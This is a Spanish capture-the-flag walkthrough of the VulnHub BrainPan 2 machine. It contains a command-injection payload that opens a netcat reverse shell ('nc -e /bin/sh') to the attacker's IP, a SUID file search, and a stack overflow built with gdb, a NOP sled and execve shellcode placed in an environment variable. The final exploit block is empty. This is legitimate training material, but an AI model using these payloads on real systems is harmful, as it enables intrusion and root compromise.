# BrainPan2
Desarrrollo del CTF BrainPan 2. Download: https://www.vulnhub.com/entry/brainpan-2,56/

## Escaneo de Puertos
```
nmap -n -P0 -p- -sS -sC -sV -vv -T5 -oA full 192.168.78.137
Not shown: 65533 closed ports
Reason: 65533 resets
PORT      STATE SERVICE REASON         VERSION
9999/tcp  open  abyss?  syn-ack ttl 64
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [______________________ WELCOME TO BRAINPAN 2.0________________________]
|_    LOGIN AS GUEST
10000/tcp open  http    syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Hacking Trends
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.91%I=7%D=2/17%Time=602D3B79%P=x86_64-pc-linux-gnu%r(NU
SF:LL,296,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
```

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain1.jpg" width="60%"></img>

## Enumeracion de Carpetas 
```
root@kali:~/BRAINPAN2# gobuster dir -u http://192.168.78.137:10000/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.78.137:10000/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/17 11:14:47 Starting gobuster
===============================================================
/bin (Status: 301)
===============================================================
2021/02/17 11:16:05 Finished
===============================================================
```
<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain2.jpg" width="60%"></img>


## Análisis del archivo BRAINPAN.EXE
El archivo EXE realmente es una archivo del JPEG

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain3.jpg" width="60%"></img>

## Inyección de comandos

1. La conexión indica que ingresemos con el usuario "GUEST"

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain4.jpg" width="60%"></img>

2. Buscamos las opciones que puedan permitir INYECCIÓN
El comando VIEW permite realizar inyecciones de comandos.

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain5.jpg" width="60%"></img>

3. A través de la INYECCIÓN ejecutamos un NETCAT para obtener conexión remota.

```
                         >> VIEW
    ENTER FILE TO DOWNLOAD: id; nc -e /bin/sh 192.168.78.131 5555
```
<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain6.jpg" width="60%"></img>


## ELEVAR PRIVILEGIOS

### Archivos con SETUID

Buscamos archivos con el SETUID del usuario ROOT.
```
find / -perm -u=s -type f 2>/dev/null
```
<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain7.jpg" width="60%"></img>


### BOF en Linux

1. Analizamos el funcionamiento del binario.
2. Hacemos una PoC para encontrar el SEGMENTATIONFAULT

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain8.jpg" width="60%"></img>

3. Identificamos el OFFSET

```
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 64
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A
```

```
anansi@brainpan2:/tmp$ gdb -q ./msg_root
gdb -q ./msg_root
Reading symbols from /tmp/msg_root...done.
(gdb) r `python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"'` msg
<"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"'` msg   
Starting program: /tmp/msg_root `python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"'` msg

Program received signal SIGSEGV, Segmentation fault.
0x35614134 in ?? ()
```

```
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35614134
[*] Exact match at offset 14
```

#### Verificar que podemos sobreescribir el EIP

```
(gdb) r `python -c 'print "A" * 14 + "BBBB" + "\x90" * 60'` msg
r `python -c 'print "A" * 14 + "BBBB"'` msg
The program being debugged has been started already.
Start it from the beginning? (y or n) y
y

Starting program: /tmp/msg_root `python -c 'print "A" * 14 + "BBBB"'` msg

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

4. Obtenemos la dirección de ESP
```
(gdb) x/180wx $esp
x/180wx $esp
0xbffffcf4:	0x0804872e	0xbffffd06	0x0804a008	0x00000003
0xbffffd04:	0x4141fdd4	0x41414141	0x41414141	0x0804a008
0xbffffd14:	0x42424242	0xbffffd28	0x0804877b	0xbffffeec
0xbffffd24:	0xbfffff3b	0xbffffda8	0xb7e8ee46	0x00000003
0xbffffd34:	0xbffffdd4	0xbffffde4	0xb7fe0860	0xb7ff6821
0xbffffd44:	0xffffffff	0xb7ffeff4	0x08048351	0x00000001
0xbffffd54:	0xbffffd90	0xb7fefc16	0xb7fffac0	0xb7fe0b58
0xbffffd64:	0xb7fd6ff4	0x00000000	0x00000000	0xbffffda8
0xbffffd74:	0xc0e07fc9	0xeec609d9	0x00000000	0x00000000
0xbffffd84:	0x00000000	0x00000003	0x08048550	0x00000000
0xbffffd94:	0xb7ff59c0	0xb7e8ed6b	0xb7ffeff4	0x00000003
0xbffffda4:	0x08048550	0x00000000	0x08048571	0x0804873b
0xbffffdb4:	0x00000003	0xbffffdd4	0x080487a0	0x08048790
0xbffffdc4:	0xb7ff0590	0xbffffdcc	0xb7fff908	0x00000003
0xbffffdd4:	0xbffffede	0xbffffeec	0xbfffff3b	0x00000000
0xbffffde4:	0xbfffff3f	0xbfffff47	0xbfffff59	0xbfffff6e
0xbffffdf4:	0xbfffff7d	0xbfffff8c	0xbfffff97	0xbfffffb2
0xbffffe04:	0xbfffffc3	0xbfffffce	0xbfffffdc	0xbfffffe5
0xbffffe14:	0x00000000	0x00000020	0xb7fe1414	0x00000021
0xbffffe24:	0xb7fe1000	0x00000010	0x0f8bfbff	0x00000006
0xbffffe34:	0x00001000	0x00000011	0x00000064	0x00000003
0xbffffe44:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffffe54:	0x00000008	0x00000007	0xb7fe2000	0x00000008
---Type <return> to continue, or q <return> to quit---

0xbffffe64:	0x00000000	0x00000009	0x08048550	0x0000000b
0xbffffe74:	0x000003e8	0x0000000c	0x000003e8	0x0000000d
0xbffffe84:	0x000003e8	0x0000000e	0x000003e8	0x00000017
0xbffffe94:	0x00000000	0x00000019	0xbffffebb	0x0000001f
0xbffffea4:	0xbfffffee	0x0000000f	0xbffffecb	0x00000000
0xbffffeb4:	0x00000000	0xc4000000	0x0f834d9d	0xe75b1f8d
0xbffffec4:	0x254b0bc7	0x693d7097	0x00363836	0x00000000
0xbffffed4:	0x00000000	0x00000000	0x742f0000	0x6d2f706d
0xbffffee4:	0x725f6773	0x00746f6f	0x41414141	0x41414141
0xbffffef4:	0x41414141	0x42424141	0x90904242	0x90909090
0xbfffff04:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffff14:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffff24:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfffff34:	0x90909090	0x6d009090	0x53006773	0x4c564c48
0xbfffff44:	0x4800323d	0x3d454d4f	0x6d6f682f	0x6e612f65
0xbfffff54:	0x69736e61	0x444c4f00	0x3d445750	0x74706f2f
0xbfffff64:	0x6172622f	0x61706e69	0x4f4c006e	0x4d414e47
0xbfffff74:	0x6e613d45	0x69736e61	0x2f3d5f00	0x2f727375
0xbfffff84:	0x2f6e6962	0x00626467	0x554c4f43	0x3d534e4d
0xbfffff94:	0x50003038	0x3d485441	0x6e69622f	0x2f3a2e3a
0xbfffffa4:	0x2f727375	0x3a6e6962	0x6962732f	0x414c006e
0xbfffffb4:	0x653d474e	0x53555f6e	0x4654552e	0x4c00382d
```

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain9.jpg" width="80%"></img>


5. Colocar el  SHELLCODE

Al colocar las direcciones 0xbfffff04, 0xbfffff14, etc, direcciones en donde se encuentran los NOPS nuestra SHELLCODE no funciona. 
Leyendo sobre como solucionar este problema, al parecer se debe a que el BUFFER es muy pequeño para el tamaño de la SHELLCODE por lo que existe un "truco". El truco consiste en colocar lo NOPS y SHELLCODE en una variable de entorno, obtener la dirección de memoria de la variable de entorno y apunto el registro EIP a dicha dirección.

```
#include <stdio.h>
#include <stdlib.h>
 
int main(void)
{
  char *s = getenv("EGG");
  printf("EGG => %p\n", s);
  return 0;
}
```
> Debido a que no existe el compilador GCC en el computador BRAINPAN2, lo vamos a compilar en nuestro KALI y luego lo enviamos a BRAINPAN2.

<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain10.jpg" width="80%"></img>
<img src="https://github.com/El-Palomo/BrainPan2/blob/main/Brain11.jpg" width="80%"></img>


> Configuramos la variable de entorno con los NOPS y SHELLCODE. Luego obtener la dirección en memoria del mismo.

```
anansi@brainpan2:/tmp$ export EGG=`perl -e 'print "\x90"x64000 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'`
<x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'`  
anansi@brainpan2:/tmp$ chmod +x ./getenv
chmod +x ./getenv
anansi@brainpan2:/tmp$ ./getenv
./getenv
EGG => 0xbfff055c
```

> Ejecutamos el EXPLOIT
```

```









